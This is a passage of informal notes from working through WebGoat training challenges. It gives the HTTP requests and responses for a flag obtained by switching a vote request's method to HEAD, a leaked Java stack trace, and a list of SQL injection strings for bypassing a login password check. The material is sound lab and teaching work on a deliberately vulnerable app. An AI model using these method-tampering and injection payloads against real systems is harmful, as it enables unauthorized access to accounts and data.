org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84)\n\tat io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62)\n\tat io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68)\n\tat io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36)\n\tat io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68)\n\tat io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132)\n\tat io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57)\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\n\tat io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46)\n\tat io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64)\n\tat io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60)\n\tat io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77)\n\tat io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43)\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\n\tat io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269)\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78)\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133)\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130)\n\tat io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48)\n\tat io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43)\n\tat io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249)\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78)\n\tat io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99)\n\tat io.undertow.server.Connectors.executeRootHandler(Connectors.java:376)\n\tat io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830)\n\tat java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n\tat java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n\tat java.base/java.lang.Thread.run(Thread.java:834)\n",
  "path" : "/WebGoat/challenge/7"
}

Without account!!
    Trying Burpsuite!?
        
        Try with send to Repeater from the request vote!!
            Change HTTP methods to HEAD then got the flag!!

HEAD /WebGoat/challenge/8/vote/5 HTTP/1.1
Host: 129.241.200.165:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://129.241.200.165:8080/WebGoat/start.mvc
X-Requested-With: XMLHttpRequest
Cookie: JSESSIONID=mhISk2qm-lo4Bc5FYVyiWNFeFZaCYyZf4eLVkLAz
Connection: close

HTTP/1.1 200 OK
X-Flag: Thanks for voting, your flag is: bc135405-e3b7-4753-8d75-2b971342a6ef
Connection: close
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Length: 0
Date: Thu, 17 Oct 2019 08:43:02 GMT


            
            Using HTTP method OPTIONS instead of GET!

OPTIONS /WebGoat/challenge/8/vote/5 HTTP/1.1
Host: 129.241.200.165:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://129.241.200.165:8080/WebGoat/start.mvc
X-Requested-With: XMLHttpRequest
Cookie: JSESSIONID=mhISk2qm-lo4Bc5FYVyiWNFeFZaCYyZf4eLVkLAz
Connection: close

        Response
HTTP/1.1 200 OK
Allow: GET,HEAD,OPTIONS
Connection: close
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Length: 0
Date: Thu, 17 Oct 2019 08:40:50 GMT


        
        Exclude!
            http://129.241.200.165:8080/WebGoat/service/start.mvc
            http://129.241.200.165:8080/WebGoat/service/lessonmenu.mvc
            http://129.241.200.165:8080/WebGoat/service/lessonoverview.mvc
        https://www.youtube.com/watch?v=fqNgSip10Rw

    Hint: https://cysecguide.blogspot.com/2019/05/webgoat-write-upwithout-account.html
    Script!!
        http://129.241.200.165:8080/WebGoat/lesson_js/challenge8.js

Without password!?
    http://129.241.200.165:8080/WebGoat/start.mvc#lesson/Challenge5.lesson

    Try SQL injection!!
        ' or '1' = '1
        ' or TRUE
        ' or 1
        ' or true

    - Try with ' in the password receiving:
        Request processing failed; nested exception is java.sql.SQLSyntaxErrorException: malformed string: ''' in statement [select password from challenge_users_xgPgeqofyVZodhwI where userid = 'Larry' and password = ''']!!